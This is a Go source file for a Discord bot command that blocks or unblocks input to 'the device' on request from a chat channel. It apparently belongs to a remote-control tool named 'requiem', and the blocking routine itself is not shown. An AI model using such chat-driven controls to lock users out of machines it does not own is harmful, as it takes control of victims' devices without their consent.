package commands

import (
	"fmt"
	"strings"

	"requiem/funcs"
	"requiem/utils"

	"github.com/bwmarrin/discordgo"
)

func (*InputCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
	blocked := false
	var err error

	content := strings.Join(args, " ")
	if utils.HasFlag(content, "block") {
		blocked, err = funcs.DisableInputs(true)
	} else if utils.HasFlag(content, "unblock") {
		blocked, err = funcs.DisableInputs(false)
	} else {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Invalid flag.", msg.Reference())
		return
	}

	if blocked {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully set input.", msg.Reference())
	} else {
		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to set input - %s", err), msg.Reference())
	}
}

func (*InputCommand) Name() string {
	return "input"
}

func (*InputCommand) Info() string {
	return "Block or unblock inputs to the device."
}

type InputCommand struct{}
